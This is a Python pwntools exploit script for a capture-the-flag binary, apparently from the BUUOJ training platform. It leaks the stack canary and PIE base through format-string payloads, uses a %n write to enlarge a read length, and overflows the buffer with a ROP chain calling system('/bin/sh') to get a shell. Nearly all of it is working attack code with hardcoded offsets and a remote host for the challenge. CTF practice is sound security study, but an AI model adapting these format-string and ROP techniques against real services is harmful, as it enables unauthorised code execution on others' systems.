# template-v1.0 for exploit scripts by fa1c4
# usage: python exp.py [REMOTE|GDB|NULL]
'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
exp:
1.leak canary value by fmtstr to bypass the canary
2.leak binary address by fmtstr to bypass the PIE
3.write the var money to trigger overflow in read(0, vivo50, money)
4.buffer overflow to backdoor then get shell
'''
from pwn import *

# define the context
binary_name = './pwn'
libc_name = ''
elf = ELF(binary_name, checksec=True) if binary_name else None
libc = ELF(libc_name, checksec=False) if libc_name else None
context.binary = elf
context(arch=elf.arch, os=elf.os)
context.terminal = ['tmux', 'splitw', '-h']

# define the io functions
rc  = lambda *x, **y: io.recv(*x, **y)
rl  = lambda *x, **y: io.recvline(*x, **y)
ru  = lambda *x, **y: io.recvuntil(*x, **y)
sn  = lambda *x, **y: io.send(*x, **y)
sl  = lambda *x, **y: io.sendline(*x, **y)
sa  = lambda *x, **y: io.sendafter(*x, **y)
sla = lambda *x, **y: io.sendlineafter(*x, **y)

# define the io object
if args.REMOTE:
    io = remote('node5.buuoj.cn', 28598)
elif args.GDB:
    io = gdb.debug(binary_name, gdbscript="""
        brva 0x0000000000000A77
        c
    """, aslr=False)
else:
    io = process(binary_name)

# exploiting code
payload = b"%11$p-%9$p"
sla(b'Now answer me, will you v me 50', payload)
rl()
canary_value = int(ru(b'-')[0:18], 16)
ebp_addr = int(rc(14), 16)
binary_base_addr = ebp_addr - 0x840
money_addr = binary_base_addr + 0x20206C
log.info(f'canary_value: {hex(canary_value)}')
log.info(f'ebp_addr: {hex(ebp_addr)}')
log.info(f'binary_base_addr: {hex(binary_base_addr)}')
log.info(f'money_addr: {hex(money_addr)}')

ru(b'What do you want to say to the canary\n')
payload = b'%999c%8$n' + b'F'*0x7 + p64(money_addr)
sl(payload)

system_addr = binary_base_addr + 0x9DC
binsh_addr = binary_base_addr + 0x202020
pop_rdi_addr = binary_base_addr + 0xB33

payload = cyclic(0x30-0x8) + p64(canary_value) + cyclic(8) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)
sl(payload)

# interact with the shell
io.interactive()
